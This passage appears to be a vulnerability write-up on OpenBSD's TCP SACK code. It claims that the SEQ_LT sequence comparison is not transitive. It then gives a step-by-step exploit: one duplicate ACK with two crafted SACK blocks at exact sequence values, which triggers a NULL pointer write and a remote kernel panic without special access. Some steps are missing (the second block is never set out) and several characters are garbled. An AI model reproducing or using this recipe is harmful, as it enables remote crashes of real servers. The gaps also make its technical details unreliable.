  That reasoning assumes SEQ_LT is transitive. It isn't.

  ---
  The invariant breaks: SEQ_LT is not transitive

  The SEQ_LT(a,b) macro is (int)((a)-(b)) < 0. This defines a circular ordering: any value divides the 32-bit space into a "before" half and an "after"
  half. This ordering is not transitive. When three values span more than 2^31 of sequence space, you can have A < B and B < C and C < A simultaneously вҖ”
  a cycle.

  Constructing the exploit

  Three values: snd_una, block1.end, sack2.start. If they span > 2^31, the comparisons form a cycle:

  Setup: Established TCP connection, SACK enabled (OpenBSD default). Server has any unacknowledged data.

  Server state:  snd_una = 0x00000000,  snd_max = 0x00010000

  Attacker sends one ACK with: th_ack = 0x00000000 (duplicate ACK), containing a SACK option with two blocks.

  Block 1: start = 0x00002000, end = 0x00008000
  - All validation passes
  - First-hole path creates: hole [0x00000000, 0x00002000), rcv_lastsack = 0x00008000

  - SEQ_LEQ(sack.start, cur->start): (int)(0x80006000 - 0) = -2147459072 вүӨ 0. TRUE вҖ” covers start
  - SEQ_GEQ(sack.end, cur->end): (int)(0x2010 - 0x2000) = +16. TRUE вҖ” covers end

  - SEQ_LT(rcv_lastsack=0x00008000, sack.start=0x80006000):
    (int)(0x00008000 - 0x80006000) = (int)(0x80002000) = -2147475456 < 0. TRUE.

  - Line 2586: p->next = temp;    // p == NULL вҶ’ KERNEL PANIC

  Constraints:

  - Server has any unacknowledged data (even 1 byte)
  - Knowledge of snd_una (observable from data stream)
  - NO special timing, NO race condition, NO privileged position
